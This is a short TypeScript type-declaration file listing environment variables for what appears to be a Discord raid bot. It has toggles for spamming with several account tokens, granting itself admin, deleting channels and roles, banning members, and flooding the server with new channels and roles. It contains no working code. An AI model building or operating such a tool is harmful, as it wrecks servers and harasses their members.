export {};

declare global {
	namespace NodeJS {
		interface ProcessEnv {
			DISCORD_TOKEN: string;
			GUILD_ID: string;
			DEVELOPER_USER_ID: string;
			SPAM_PING_USER: boolean;
			SPAM_TEXT: string;
			SPAM_TOKENS: string[];
			SPAM: boolean;
			GIVE_ADMIN_PERMS: boolean;
			ADMIN_ROLE_NAME: string;
			REMOVE_CHANNELS: boolean;
			REMOVE_ROLES: boolean;
			BAN_MEMBERS: boolean;
			CHANNELS_FLOOD: boolean;
			CHANNELS_FLOOD_NAME: string;
			CHANNELS_FLOOD_TEXT: string;
			ROLES_FLOOD: boolean;
			ROLES_FLOOD_NAME: string;
		}
	}
}
